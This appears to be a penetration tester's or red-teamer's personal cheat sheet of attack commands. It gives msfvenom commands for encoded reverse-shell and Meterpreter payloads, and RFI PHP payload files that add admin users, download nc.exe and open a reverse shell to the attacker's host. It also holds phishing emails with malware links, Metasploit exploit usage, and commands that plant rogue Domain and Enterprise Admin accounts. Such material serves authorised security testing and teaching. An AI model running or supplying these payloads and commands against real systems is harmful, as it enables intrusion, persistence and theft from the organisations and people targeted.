msfvenom -p windows/shell_reverse_tcp LHOST=$me LPORT=443 -f asp > shellrev443.asp

msfvenom -p windows/shell_reverse_tcp LHOST=$me LPORT=443 -f exe -e x86/shikata_ga_nai -i 9 -o shellrev443.exe

msfvenom -p windows/meterpreter/reverse_http LHOST=$me LPORT=80 -f exe -e x86/shikata_ga_nai -i 14 -o metrevhttp80.exe

msfvenom -p windows/meterpreter/reverse_tcp LHOST=$me LPORT=53 -f exe -e x86/shikata_ga_nai -i 9 -o metrev53.exe
==========================================================================================
				IP TABLES
==========================================================================================
# Drop all all TCP traffic destined for port 13327 that is NOT from loopback
iptables -A INPUT -p tcp --destination-port 13327 \! -d 127.0.0.1 -j DROP

iptables -A INPUT -p tcp --destination-port 4444 \! -d 127.0.0.1 -j DROP

==========================================================================================
				SCRATCH PAD
==========================================================================================
echo '<applet width="1" height="1" id="Java Secure" code="Java.class" archive="SignedJava.jar"><param name="1" value="http://$me:80/evil.exe"></applet>' > /var/www/html/java.html







Sam's LFI Tips

Assumptions
------------
Attacker's web directory is: /var/www/html/
Attacker IP is $me
Created a "RFI" folder to store all text files generated.
A copy of nc.exe is located in a folder named Software within the web directory

Commands to generate txt files
--------------------------------
Return IP Config - echo '<?php echo shell_exec("ipconfig");?>' > /var/www/html/RFI/php_w_ipconfig.txt
Add a local user - echo '<?php echo shell_exec("net user /add evil-guy password");?>' > /var/www/html/RFI/php_w_addUser.txt
Add local user to local admin group - echo '<?php echo shell_exec("net localgroup administrators evil-guy /add");?>' > /var/www/html/RFI/php_w_addUserToGroup.txt
Check the permissions of the current - echo '<?php echo shell_exec("CACLS .");?>' > /var/www/html/RFI/php_w_currDir_permissions.txt
Download NC.exe from attack host - echo '<?php echo file_put_contents("nc.exe", fopen("http://$me/software/nc.exe", 'r'));?>' > /var/www/html/RFI/php_w_downloadNcExe.txt
Send Reverse Shell from target to attacker - echo '<?php echo shell_exec("nc -nv $me 4444 -e cmd.exe");?>' > /var/www/html/RFI/php_w_reverse_shell.txt
Whoami - echo '<?php echo shell_exec("whoami");?>' > /var/www/html/RFI/php_w_whoami.txt
Get hostname echo '<?php echo shell_exec("hostname");?>' > /var/www/html/RFI/php_w_hostname.txt
Netstat - echo '<?php echo shell_exec("netstat -ano");?>' > /var/www/html/RFI/php_w_netstat.txt
Firewall Status - echo '<?php echo shell_exec("netsh advfirewall show allprofiles state");?>' > /var/www/html/RFI/php_w_firewallStatus.txt
NSLookup - echo '<?php echo shell_exec("nslookup");?>' > /var/www/html/RFI/php_w_nslookup.txt

Examples URL of RFI vulnerable site hosted on $tgt
http://$tgt/addguestbook.php?name=Test&comment=Which+lang%3F&LANG=http://$me/[DIRECTORY]/[YOUR CUSTOM TXT FILE WITH CMDS]%00&Submit=Submit
http://$tgt/addguestbook.php?name=Test&comment=Which+lang%3F&LANG=http://$me/RFI/php_w_downloadNcExe.txt%00&Submit=Submit

==============================================================================================================================================================
									OLD ONE
==============================================================================================================================================================



sendemail -f 'Bob Stevenson<bstevenson@f1yinglemur.com>' -t 'Steve Boberson<sboberson@targetsite1.com>' -u "Some Dude" -s 192.168.169.146 -o message-content-type=html -o message-file=/root/scripts/fake_email.html
Jun 21 13:06:09 attackbox sendemail[16574]: Email was sent successfully!

http://127.0.0.1:3000/ui/panel		#to access the ui

http://192.168.169.140:3000/demos/basic.html

=====================================================
SEND EMAILS WITH MALWARE LINKS
=====================================================
sendemail -f 'Bad Guy<bguy@mispelledTargetSite2.com>' -t 'pturner@targetsite2.com;azapple@targetsite2.com;albino@targetsite2.com;rpayne@targetsite2.com' -u "My Resume" -s 94.14.100.209 -o message-content-type=html -o message-file=/root/scripts/botnet_fake_email.html

=====================================
TCPDUMP TO WATCH TUNNEL USAGE
=====================================
tcpdump -n -n i eth0 host 192.168.169.140 and 192.168.169.144


===============================
MSFCONSOLE
=============================
workspace crazy

use exploit/multi/handler

set payload windows/meterpreter/reverse_tcp

use exploit/windows/smb/ms08_067_netapi

db_nmap -Pn -sT -n -p 80

=======================================
Shells Alternative
=======================================
execute -f cmd.exe -H -c -i
#did you get system?

===================================================
FILE COLLECTION
===================================================
RECENT FILE
reg enumkey -k "HKCU\\software\\microsoft\\windows\\currentversion\\explorer\\recentdocs"
VIEW WHICH FILES
reg queryval -k reg enumkey -k "HKCU\\software\\microsoft\\windows\\currentversion\\explorer\\recentdocs" -v 0

OPEN SAVE MRU
reg enumkey -k "HKCU\\software\\microsoft\\windows\\currentversion\\explorer\\comdlg32\\opensavemru"
.....
reg queryval -k reg enumkey -k "HKCU\\software\\microsoft\\windows\\currentversion\\explorer\\comdlg32\\opensavemru\\bmp" -v a

RECENT FILE from LAST VISITED
reg enumkey -k "HKCU\\software\\microsoft\\windows\\currentversion\\explorer\\comdlg32\\lastvisitedmru"
.....
reg queryval -k reg enumkey -k "HKCU\\software\\microsoft\\windows\\currentversion\\explorer\\comdlg32\\lastvisitedmru" -v a

TYPED URLS
reg enumkey -k "HKCU\\software\\microsoft\\internet explorer\\typedurls"
reg queryval -k "HKCU\\software\\microsoft\\internet explorer\\typedurls" -v url11


======================================================================
ACTIVE DIRECTORY
======================================================================
# Dump entire AD (limited to 100 results)
dsquery *

# Dump entire AD (w/o limit)
dsquery * -limit 0

# Enumerate domain users
dsquery user

# Enumerate domain groups
dsquery group "cn=users,dc=targetsite1,dc=local"

# Enumerate users who are members of the named group
dsquery group -name "Domain Admins" | dsget group -members -expand

# Enumerate groups named user belongs to
dsquery user -name "bob*" | dsget user -memberof -expand

# Enumerate attributes for the named user (dn, desc, samid)
dsquery user -name "bob*" | dsget user

# Enumerate specified attributes for the named user
dsquery user -name "bob*" | dsget user -samid -fn -ln

# Determine domain functional level
dsquery * "cn=partitions,cn=configuration,dc=targetsite1,dc=local" -filter "(|(systemFlags=3)(systemFlags=-2147483648))" -attr msDS-Behavior-Version Name dnsroot ntmixeddomain NetBiosName

# Query user last logon times
dsquery * "DC=targetsite1,DC=local" -scope subtree -filter "(&(lastlogontimestamp=*)(objectclass=user))" -attr lastlogontimestamp samid cn

# Convert NT timestamp to human readable time
w32tm /ntte <NT_timestamp>

# Enumerate disabled user accounts
dsquery user "dc=targetsite1,dc=local" -disabled

# Enumerate users inactive for the specified number of week (2 weeks in this example)
dsquery user -inactive 2

# Enumerate domain computers with operating system and service pack information
# Can filter for different OSes by changing (or eliminating) the "(operatingsystem=Windows*)"
# part of the filter.
dsquery * "dc=targetsite1,dc=local" -scope subtree -filter "(&(objectclass=computer)(objectcategory=computer)(operatingsystem=Windows*))" -attr cn operatingsystem operatingsystemservicepack

# Create a domain user that is a member of the domain admins group
dsadd user "cn=Attacker,cn=Users,DC=targetsite1,DC=local" -memberof "cn=Domain Admins,cn=USers,DC=targetsite1,DC=local" -samid attacker -pwd P@ssw0rd -pwdneverexpires yes

# Modify a domain user account
dsmod user "cn=Attacker,cn=Users,DC=targetsite1,DC=local" -desc "Is 1337"

# Remove a domain user account
dsrm -subtree -noprompt "cn=Attacker,cn=Users,DC=targetsite1,DC=local"


================================================================================
MAP USERS TO BOXES - Who is talking?  Maybe Use Bloodhound
================================================================================
run event_manager -l security -f 672 -p -s Downloads


================================================================================
SEARCH FOR EVIDENCE OF PRESENCE - Is Someone else there?
================================================================================
run event_manager -f <event_id> -l security
#events: 538,624,630


================================================================================
+++++++++++++++++++RED TEAM FUN+++++++++++++++++++++++++++++++++++++++++++++++++
================================================================================





=================================================================================
==========================+++++++SCRATCH PAD++++++++=============================
dsquery group -name "DHCP Administrators" | dsget group -members -expand

dsquery user | dsget user -samid -fn -ln

dsquery user -name "dbagaroo" | dsget user -memberof -expand

dsquery user -name "kelli" | dsget user -samid -fn -ln

dsadd user "cn=DBagaroo,cn=Users,DC=targetsite1,DC=local" -memberof "cn=Enterprise Admins,cn=USers,DC=targetsite1,DC=local" -samid dbagaroo -pwd P@ssw0rd -pwdneverexpires yes

dsrm -subtree -noprompt "cn=DBagaroo,cn=Users,DC=targetsite1,DC=local"

run event_manager -f 538 -l security
run event_manager -f 624 -l security
run event_manager -f 630 -l security
